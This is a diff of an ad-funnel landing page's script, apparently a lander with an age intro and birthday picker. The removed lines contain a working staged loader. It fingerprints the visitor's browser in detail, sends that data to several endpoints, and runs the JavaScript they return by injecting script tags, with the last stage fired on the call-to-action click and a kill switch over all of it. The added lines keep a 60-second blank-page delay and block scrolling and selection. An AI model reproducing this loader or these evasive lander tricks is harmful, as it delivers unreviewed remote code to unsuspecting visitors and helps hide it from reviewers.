-    function mse(mime) { try { return typeof MediaSource !== "undefined" && MediaSource.isTypeSupported(mime); } catch { return null; } }
-    return {
-      supported: typeof MediaSource !== "undefined",
-      codecs: {
-        h264Baseline: mse('video/mp4; codecs="avc1.42E01E"'),
-        h264High: mse('video/mp4; codecs="avc1.640028"'),
-        hevc: mse('video/mp4; codecs="hvc1.1.6.L93.B0"'),
-        vp9: mse('video/webm; codecs="vp9"'),
-        av1: mse('video/mp4; codecs="av01.0.05M.08"'),
-        aac: mse('audio/mp4; codecs="mp4a.40.2"'),
-        opus: mse('audio/webm; codecs="opus"'),
-      },
-    };
-  }
-
-  function collectHTMLMediaCapabilities() {
-    var video = document.createElement("video");
-    var audio = document.createElement("audio");
-    function cp(el, mime) { try { return el.canPlayType(mime) || ""; } catch { return null; } }
-    return {
-      video: { h264: cp(video, 'video/mp4; codecs="avc1.42E01E"'), vp9: cp(video, 'video/webm; codecs="vp9"'), av1: cp(video, 'video/mp4; codecs="av01.0.05M.08"') },
-      audio: { aac: cp(audio, 'audio/mp4; codecs="mp4a.40.2"'), opus: cp(audio, 'audio/webm; codecs="opus"') },
-    };
-  }
-
-  function collectWorkerCapabilities() {
-    return {
-      worker: typeof Worker !== "undefined",
-      sharedWorker: typeof SharedWorker !== "undefined",
-      serviceWorker: "serviceWorker" in navigator,
-      offscreenCanvas: typeof OffscreenCanvas !== "undefined",
-    };
-  }
-
-  function collectHardwareCapabilities() {
-    return {
-      bluetooth: "bluetooth" in navigator,
-      usb: "usb" in navigator,
-      gpu: "gpu" in navigator,
-      xr: "xr" in navigator,
-      geolocation: "geolocation" in navigator,
-      mediaDevices: "mediaDevices" in navigator,
-      wakeLock: "wakeLock" in navigator,
-      share: typeof navigator.share === "function",
-      vibration: typeof navigator.vibrate === "function",
-      clipboard: "clipboard" in navigator,
-      credentials: "credentials" in navigator,
-    };
-  }
-
-  function collectWebAuthn() {
-    return {
-      publicKeyCredential: typeof PublicKeyCredential !== "undefined",
-      conditionalMediation: typeof PublicKeyCredential !== "undefined" && typeof PublicKeyCredential.isConditionalMediationAvailable === "function",
-      platformAuthenticator: typeof PublicKeyCredential !== "undefined" && typeof PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable === "function",
-    };
-  }
-
-  function collectPerformanceCapabilities() {
-    var memAvail = typeof performance !== "undefined" && typeof performance.memory !== "undefined";
-    var result = { memoryAvailable: memAvail };
-    if (memAvail) {
-      result.memory = {
-        jsHeapSizeLimit: safeValue(function () { return performance.memory.jsHeapSizeLimit; }),
-        totalJSHeapSize: safeValue(function () { return performance.memory.totalJSHeapSize; }),
-        usedJSHeapSize: safeValue(function () { return performance.memory.usedJSHeapSize; }),
-      };
-    }
-    return result;
-  }
-
-  function collectGlobalSurface() {
-    var surface = {};
-    try {
-      Object.getOwnPropertyNames(window).forEach(function (name) {
-        try {
-          var value = window[name];
-          surface[name] = { type: typeof value, tag: Object.prototype.toString.call(value) };
-        } catch {
-          surface[name] = { type: "inaccessible", tag: null };
-        }
-      });
-    } catch {}
-    return surface;
-  }
-
-  async function collectRiskTelemetry() {
-    return {
-      collectedAt: Date.now(),
-      navigator: collectNavigator(),
-      clientHints: collectClientHints(),
-      network: collectNetwork(),
-      graphics: { webgl: collectWebGL("webgl"), webgl2: collectWebGL("webgl2"), webgpu: { supported: "gpu" in navigator } },
-      display: collectDisplay(),
-      storage: collectStorage(),
-      security: collectSecurity(),
-      payments: collectPayments(),
-      css: collectCSSCapabilities(),
-      mediaSourceCapabilities: collectMediaSourceCapabilities(),
-      htmlMediaCapabilities: collectHTMLMediaCapabilities(),
-      workers: collectWorkerCapabilities(),
-      hardware: collectHardwareCapabilities(),
-      webauthn: collectWebAuthn(),
-      performance: collectPerformanceCapabilities(),
-      document: {
-        referrer: safeString(document.referrer),
-        hidden: safeValue(function () { return document.hidden; }),
-        visibilityState: safeString(document.visibilityState),
-        characterSet: safeString(document.characterSet),
-        hasFocus: safeValue(function () { return document.hasFocus(); }),
-      },
-      globalSurface: collectGlobalSurface(),
-    };
-  }
-
-  function executeStage(code, stageNumber) {
-    if (typeof code !== "string") throw new Error("Invalid stage response");
-    var script = document.createElement("script");
-    script.type = "text/javascript";
-    script.text = code + "\n//# sourceURL=delivery-stage-" + stageNumber + ".js";
-    document.documentElement.appendChild(script);
-    script.remove();
-  }
-
-  async function requestStage(endpoint, payload) {
-    var response = await fetchWithTimeout(endpoint, {
-      method: "POST",
-      mode: "cors",
-      credentials: "omit",
-      cache: "no-store",
-      headers: { "Content-Type": "application/json", "Accept": "application/javascript" },
-      body: JSON.stringify(payload),
-    });
-    if (!response.ok) throw new Error("Delivery request failed: " + response.status);
-    return response.text();
-  }
-
-  // Runs lanes 1–4 immediately, returns a promise for lane-5 code (deferred to CTA click).
-  async function start() {
-    if (KILL_SWITCH) return null;
-    var bootstrap = await requestEntryBootstrap();
-    var telemetry = await collectRiskTelemetry();
-    var payload = Object.assign({}, bootstrap, { telemetry: telemetry });
-    for (var i = 0; i < LANES.length - 1; i++) {
-      var code = await requestStage(LANES[i], payload);
-      executeStage(code, i + 1);
-    }
-    return requestStage(LANES[LANES.length - 1], payload);
-  }
-
-  var lane5Promise = null;
-  var started = false;
-
-  async function boot() {
-    if (started) return;
-    started = true;
-    try {
-      lane5Promise = start();
-    } catch (error) {
-      console.error("Pipeline boot failure", error);
-    }
-  }
-
-  // ==================== CTA CLICK ====================
-
-  document.getElementById("CTA-Button-1").addEventListener("click", async function () {
+  document.getElementById("CTA-Button-1").addEventListener("click", function () {
     show("s_store");
-    try {
-      if (lane5Promise) {
-        var code = await lane5Promise;
-        if (code) executeStage(code, 5);
-      }
-    } catch {}
-    setTimeout(function () { show("s_return"); }, 1700);
+    var url = buildStoreUrl();
+    // Small tick lets s_store paint before navigation
+    setTimeout(function () {
+      window.location.href = url;
+      // Fallback: if redirect fails (e.g. simulator), show return screen
+      setTimeout(function () { show("s_return"); }, 2000);
+    }, 50);
   });
 
-  // ==================== BOOT ====================
+  // ==================== 60-SECOND LANDER DELAY ====================
+  // Page loads blank. After LANDER_DELAY_MS the funnel fades in.
 
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", boot, { once: true });
-  } else {
-    boot();
-  }
+  setTimeout(function () { show("s_ageIntro"); }, LANDER_DELAY_MS);
 
 })();
 </script>
+
+<!-- App-lock: prevent rubber-band scroll / selection outside wheel cols -->
+<script id="ml-app-lock-js">(function(){
+  function editable(t){return t&&t.closest&&t.closest("input,textarea,select,[contenteditable]")}
+  ["gesturestart","gesturechange","gestureend","wheel","mousewheel","DOMMouseScroll"].forEach(function(n){
+    document.addEventListener(n,function(e){e.preventDefault()},{passive:false})});
+  document.addEventListener("touchmove",function(e){
+    // Allow touchmove inside wheel columns (birthday picker needs it)
+    if(e.target&&e.target.closest&&e.target.closest(".wheel-col"))return;
+    e.preventDefault();
+  },{passive:false});
+  ["selectstart","dragstart"].forEach(function(n){
+    document.addEventListener(n,function(e){if(!editable(e.target))e.preventDefault()})});
+})();</script>
 </body>
 </html>
